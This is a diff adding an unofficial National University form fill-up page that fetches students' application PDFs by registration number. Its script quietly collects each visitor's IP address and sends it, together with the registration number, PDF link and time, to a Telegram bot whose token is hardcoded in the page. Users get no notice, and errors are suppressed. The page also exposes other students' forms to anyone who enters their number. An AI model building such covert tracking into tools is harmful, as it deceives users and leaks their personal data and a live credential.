@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2nd Year From Fill-up!</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        .container {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        img {
+            width: 100%;
+            max-width: 250px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .data-display {
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        marquee {
+            font-size: 16px;
+            color: #007bff;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card center">
+            <!-- Marquee Section -->
+            <marquee behavior="scroll" direction="left">Welcome to the NU Form Fill-up Portal. Please enter your Registration number below. Then Download your from in pdf Formet </marquee>
+
+            <!-- Image -->
+            <center>
+                <img src="http://ems.nu.ac.bd/img/nu_logo_r.53c3c0be.png" alt="NU Logo">
+            </center>
+
+            <!-- Input Field -->
+            <input type="text" id="numberInput" class="form-control my-2" placeholder="Enter number (e.g., 21223052100)" required>
+
+            <!-- Buttons Group -->
+            <div class="button-group">
+                <button id="displayDataBtn" class="btn btn-secondary">Display Data</button>
+                <a id="downloadBtn" class="btn btn-primary" href="#" download>Download PDF</a>
+            </div><br>
+<p class="hind-siliguri-mpadding-top="10px;" padding-bottom: 20px;">Site Developer: <a href="https://facebook.com/mhasanm828">MD Hasan Mahmud</a></p>
+            <!-- Data Display -->
+            <div id="dataDisplay" class="data-display"></div>
+        </div>
+    </div>
+
+    <!-- JavaScript for Handling Actions -->
+    <script>
+        function updateLinks() {
+            const baseUrl = "http://103.113.200.44:8006/storage/pdf/FormFillupApplicationPdf/ff_Application_form_2021-22_";
+            const number = document.getElementById("numberInput").value;
+            const downloadLink = `${baseUrl}${number}.pdf`;
+
+            const downloadBtn = document.getElementById("downloadBtn");
+
+            downloadBtn.href = downloadLink;
+            downloadBtn.textContent = `Download PDF`;
+
+            // Send the link to Telegram when the download button is clicked
+            downloadBtn.addEventListener("click", function () {
+                if (document.getElementById("numberInput").checkValidity()) {
+                    sendTelegramMessage(number, downloadLink);
+                }
+            });
+        }
+
+        async function sendTelegramMessage(number, downloadLink) {
+            const token = "7402406921:AAGBA9MXF-Ryq6o-pw6zZc8mQEjLEKxELL4";
+            const chatId = "5507924419";
+            const dateTime = new Date().toLocaleString();
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+
+            const message = `PDF Download Link for ${number}:\n${downloadLink}\n\nDate & Time: ${dateTime}\nIP Address: ${ipAddress}`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send the message but don't display errors
+            fetch(url).catch((error) => console.log("Error sending message:", error));
+        }
+
+        document.getElementById("displayDataBtn").addEventListener("click", function () {
+            const number = document.getElementById("numberInput").value;
+            const apiUrl = `http://hasanm.my.id/project/nu-info.php?reg=${number}&session=21-22`;
+
+            if (document.getElementById("numberInput").checkValidity()) {
+                window.open(apiUrl, '_blank');
+            } else {
+                document.getElementById("numberInput").reportValidity(); // This triggers the required message
+            }
+        });
+
+        document.getElementById("numberInput").addEventListener("input", updateLinks);
+
+        // Initialize the links when the page loads
+        updateLinks();
+    </script>
+</body>
+
+</html>
